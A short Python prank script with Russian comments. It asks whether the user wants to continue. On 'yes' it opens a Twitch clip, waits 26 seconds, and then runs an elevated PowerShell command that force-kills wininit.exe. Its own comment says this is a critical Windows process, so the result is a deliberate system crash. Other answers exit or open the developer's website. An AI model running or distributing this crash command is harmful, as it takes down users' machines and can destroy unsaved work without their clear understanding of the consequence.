import os
import time
import webbrowser
import sys

# Ссылки
url = "https://m.twitch.tv/etozhewilli/clip/DepressedJoyousMetalTooSpicy-AFn6UVoM5iz7eulT"
devs_website = "https://ainohana442.neocities.org"

# Сохраняем ввод пользователя в переменную 'choice'
choice = input("Вы точно хотите продолжить? (y/n): ").lower().strip()

if choice == "y":
    print("Хорошо. Удачи.")
    webbrowser.open(url)
    
    # Ожидание перед выполнением системной команды
    time.sleep(26) 
    
    # Исправленный вызов системной команды через os.system
    # Примечание: wininit завершает критический процесс системы
    os.system("powershell Start-Process taskkill -ArgumentList '/f', '/im', 'wininit.exe' -Verb runAs")

elif choice == "n":
    print("Удачного дня.")
    time.sleep(1) # Добавлено число секунд
    print("Спасибо, что протестили.")
    time.sleep(1)
    sys.exit(0)

else:
    print("Undefined. Данный ответ не 'y' или 'n'. Открываю сайт разработчика...")
    time.sleep(1)
    webbrowser.open(devs_website)
    time.sleep(2)
    sys.exit(0)
    